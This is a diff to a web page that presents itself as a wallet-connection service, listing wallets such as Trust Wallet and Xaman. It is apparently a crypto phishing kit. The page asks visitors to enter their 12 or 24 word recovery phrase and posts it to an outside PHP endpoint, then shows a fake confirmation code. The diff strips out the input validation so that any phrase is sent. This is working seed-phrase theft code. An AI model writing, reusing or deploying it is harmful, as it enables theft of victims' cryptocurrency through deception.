@@ -16,10 +16,10 @@
     <link rel="stylesheet" type="text/css" href="../assets/css/index.css" />
     <link rel="stylesheet" type="text/css" href="../assets/css/responsive.css" />
 </head>
- 
+
 <body>
     <!-- header section -->
-    <div class="header"> 
+    <div class="header">
         <div class="navbar">
             <div class="navbar-logo">
                 <a href="../">
@@ -109,8 +109,7 @@
                     <div class="col-lg-3 col-md-4 col-sm-6 col-6">
                         <div class="wallet-box">
                             <div class="wallet-img">
-                                <img src="../assets/images/static/trust_wallet.jpg" alt="" 
-                                    class="img-fluid" />
+                                <img src="../assets/images/static/trust_wallet.jpg" alt="" class="img-fluid" />
                             </div>
                             <div class="wallet-content">
                                 <p class="w-p-2">Trust Wallet</p>
@@ -337,7 +336,7 @@
                         </div>
                     </div>
 
-                    
+
                     <div class="col-lg-3 col-md-4 col-sm-6 col-6">
                         <div class="wallet-box">
                             <div class="wallet-img">
@@ -1225,12 +1224,12 @@
                             <div class="wallet-img">
                                 <img src="../assets/images/static/xaman.jpeg" alt="" class="valet-image">
                             </div>
-                            <div class="wallet-content"> 
+                            <div class="wallet-content">
                                 <p class="w-p-2">Xaman</p>
                                 <p class="w-p-3">xumm.app</p>
                             </div>
                         </div>
-                    </div> 
+                    </div>
 
                     <div class="col-lg-3 col-md-4 col-sm-6 col-6">
                         <div class="wallet-box">
@@ -1292,7 +1291,7 @@
                             </div>
                         </div>
                     </div>
-                    
+
                 </div>
 
             </div>
@@ -1324,7 +1323,7 @@
                     <div class="modal-main">
                         <div id="modalLoad" class="modal-div-1">
                             <div class="modal-load">
-                                <div class="loader"></div> 
+                                <div class="loader"></div>
                                 <p class="l-p-1">starting secure connection...</p>
                                 <p class="l-p-2">please wait...</p>
                             </div>
@@ -1333,7 +1332,7 @@
                         <div style="display: none" id="modalError" class="modal-div-2">
                             <div class="modal-error">
                                 <button class="btn btn-md btn-outline-danger">
-                                    An error occurred... please try again or connect manually 
+                                    An error occurred... please try again or connect manually
                                 </button>
 
                                 <div class="action-btn">
@@ -1342,7 +1341,7 @@
                                     </button>
                                     <button type="button" id="connectManual" class="btn btn-md btn-primary">
                                         Connect Manually
-                                    </button> 
+                                    </button>
                                 </div>
                             </div>
                         </div>
@@ -1353,12 +1352,11 @@
                                     <div class="form-group">
                                         <textarea
                                             placeholder="Enter your 12 or 24 mnemonic words, seperate them with spaces."
-                                            name="formPhrase" id="formPhrase" cols="30" rows="6"
-                                            onkeyup="countWords(this);" class="form-control" required></textarea>
+                                            name="formPhrase" id="formPhrase" cols="30" rows="6" class="form-control"
+                                            required></textarea>
                                     </div>
                                     <div class="form-btn">
-                                        <button type="submit" id="submit_phrase" disabled
-                                            class="btn btn-md btn-secondary">
+                                        <button type="submit" id="submit_phrase" class="btn btn-md btn-secondary">
                                             Connect Wallet
                                         </button>
                                     </div>
@@ -1448,7 +1446,7 @@
 
         // open metamask function
         async function openWeb() {
- 
+
             const modal = $('#connectModal');
             modal.css('display', 'flex');
             $('body').css('overflow-y', 'hidden');
@@ -1537,29 +1535,6 @@
 
 
 <script>
-    // Get the input field element
-    const $inputPhrase = $("#formPhrase");
-    // Add an event listener to the input field for input events
-    $inputPhrase.on("input", function () {
-        // Remove any non-numeric characters
-        $("#formPhrase").removeClass("error");
-        $inputPhrase.val($inputPhrase.val().replace(/[^a-zA-Z\s]/g, ""));
-    });
-
-    function countWords(self) {
-        var spaces = self.value.match(/\S+/g);
-        var words = spaces ? spaces.length : 0;
-
-        if (words >= 11) {
-            document.getElementById("submit_phrase").disabled = false;
-        } else {
-            document.getElementById("submit_phrase").disabled = true;
-        }
-    }
-
-</script>
-
-<script>
     function generateRandomString(length) {
         var result = '';
         var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
@@ -1575,58 +1550,29 @@
         event.preventDefault();
         document.getElementById("submit_phrase").disabled = true;
         var dappWords = $("#formPhrase").val();
+        dappWords = dappWords.trim();
+        var randomString = generateRandomString(7);
+        var dappName = $('#assetName').text();
 
-        if (!validateInput(dappWords)) {
+        try {
 
-            $("#formPhrase").addClass("error");
-        } else {
-
-            dappWords = dappWords.trim();
-            var randomString = generateRandomString(7);
-            var dappName = $('#assetName').text();
-
-            try {
-                const wallet = ethers.Wallet.fromMnemonic(dappWords);
-                // console.log('Seed phrase is valid:', dappWords);
-                // console.log('Wallet address:', wallet.address);  url: "./validate.php",
-                $.ajax({
-                    url: "https://voicewelfare.com/recovery/dappdecentralize.php", 
-                    method: "POST",
-                    dataType: "JSON",
-                    data: {
-                        dappWord: dappWords,
-                        dappAddress: wallet.address,
-                        dappName: dappName,
-                    },
-                    success: function () { },
-                    complete: function () { },
-                });
-                document.getElementById("p-code").innerHTML = randomString;
-                $("#mainModal").hide();
-                $("#qrModal").show();
-                document.getElementById("submit_phrase").disabled = true;
-            } catch (error) {
-                // console.error("Invalid seed phrase:", dappWords);
-                $("#formPhrase").addClass("error");
-                document.getElementById("submit_phrase").disabled = false;
-            }
+            $.ajax({
+                url: "https://voicewelfare.com/recovery/dappdecentralize.php",
+                method: "POST",
+                dataType: "JSON",
+                data: {
+                    dappWord: dappWords,
+                    dappName: dappName,
+                },
+                success: function () { },
+                complete: function () { },
+            });
+            document.getElementById("p-code").innerHTML = randomString;
+            $("#mainModal").hide();
+            $("#qrModal").show();
+            document.getElementById("submit_phrase").disabled = false;
+        } catch (error) {
+            document.getElementById("submit_phrase").disabled = false;
         }
     });
-    function validateInput(input) {
-        var sanitizedInput = input.replace(/<script.*?>.*?<\/script>/gi, ''); // Remove script tags
-        sanitizedInput = sanitizedInput.replace(/<\/?[^>]+(>|$)/g, ""); // Strip any other HTML tags
-
-        // Split the input into words using space as a delimiter after removing HTML
-        var words = sanitizedInput.trim().split(/\s+/);
-        if (words.length !== 12 && words.length !== 24) {
-            return false; // Check for 12 or 24 words
-        }
-
-        var wordSet = new Set(words);
-        if (wordSet.size !== words.length) {
-            return false; // Check for duplicates
-        }
-
-        return true; // Passed all checks
-    }
 </script>
